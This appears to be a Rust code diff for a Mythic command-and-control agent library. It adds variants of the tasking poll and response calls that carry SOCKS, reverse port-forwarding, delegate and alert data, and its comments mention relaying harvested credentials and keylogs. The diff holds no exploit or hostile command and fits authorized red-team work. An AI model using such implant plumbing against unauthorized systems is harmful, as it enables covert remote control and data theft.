@@ -11,7 +11,10 @@ use crate::protocol::codec::{
     Aes256HmacCrypto, decode_message, decode_message_plain, encode_message,
     encode_message_plain,
 };
-use crate::protocol::{ReqCheckin, ReqGetTasking, ReqPostResponse, RespGetTasking, RespPostResponse};
+use crate::protocol::{
+    AgentExtras, AgentMessageExtras, ReqCheckin, ReqGetTasking, ReqPostResponse,
+    RespGetTasking, RespPostResponse,
+};
 use crate::transport::C2Transport;
 
 /// Post-checkin phase — holds the callback UUID assigned by Mythic.
@@ -130,15 +133,28 @@ impl MythicAgent {
         Ok(())
     }
 
-    /// Poll for new tasks from the Mythic server.
+    /// Poll for new tasks from the Mythic server (no extras).
     ///
-    /// Trace fields are populated before the network call so they survive errors.
+    /// Convenience wrapper around [`get_tasking_with`](Self::get_tasking_with).
     pub fn get_tasking<C: C2Transport>(
         &mut self,
         tasking_size: u32,
         c2: &C,
     ) -> MythicResult<RespGetTasking> {
-        let req = ReqGetTasking::new(tasking_size);
+        self.get_tasking_with(tasking_size, c2, AgentMessageExtras::default())
+    }
+
+    /// Poll for new tasks, carrying delegates, SOCKS, RPFWD, interactive data,
+    /// edges, alerts, and/or responses alongside the request.
+    ///
+    /// Trace fields are populated before the network call so they survive errors.
+    pub fn get_tasking_with<C: C2Transport>(
+        &mut self,
+        tasking_size: u32,
+        c2: &C,
+        extras: AgentMessageExtras,
+    ) -> MythicResult<RespGetTasking> {
+        let req = ReqGetTasking::with_extras(tasking_size, extras);
 
         if self.debug
             && let Ok(json) = serde_json::to_string(&req)
@@ -184,11 +200,12 @@ impl MythicAgent {
         }
     }
 
-    /// Send task responses back to the Mythic server.
+    /// Send task responses back to the Mythic server (no extras).
     ///
-    /// The `responses` vector contains the output of one or more completed (or
-    /// in-progress) tasks.  Use [`crate::protocol::TaskResponse`] builders
-    /// like [`crate::protocol::TaskResponse::completed`] or construct custom
+    /// Convenience wrapper around [`post_response_with`](Self::post_response_with).
+    /// The `responses` vector contains the output of completed (or in-progress)
+    /// tasks.  Use [`crate::protocol::TaskResponse`] builders like
+    /// [`crate::protocol::TaskResponse::completed`] or construct custom
     /// responses with hooking-feature data (file browser entries, credentials,
     /// keylogs, etc.).
     pub fn post_response<C: C2Transport>(
@@ -196,7 +213,26 @@ impl MythicAgent {
         responses: Vec<crate::protocol::TaskResponse>,
         c2: &C,
     ) -> MythicResult<RespPostResponse> {
-        let req = ReqPostResponse::new(responses);
+        self.post_response_with(responses, c2, AgentExtras::default())
+    }
+
+    /// Send task responses, carrying delegates, SOCKS, RPFWD, interactive data,
+    /// edges, and/or alerts alongside the response.
+    ///
+    /// `shared` is the [`AgentExtras`] portion — it does **not** contain
+    /// `responses` (those are the first argument).  Use
+    /// [`AgentExtras::default()`] if you only need the responses.
+    pub fn post_response_with<C: C2Transport>(
+        &mut self,
+        responses: Vec<crate::protocol::TaskResponse>,
+        c2: &C,
+        shared: AgentExtras,
+    ) -> MythicResult<RespPostResponse> {
+        let extras = AgentMessageExtras {
+            responses,
+            shared,
+        };
+        let req = ReqPostResponse::from_extras(extras);
 
         if self.debug
             && let Ok(json) = serde_json::to_string(&req)
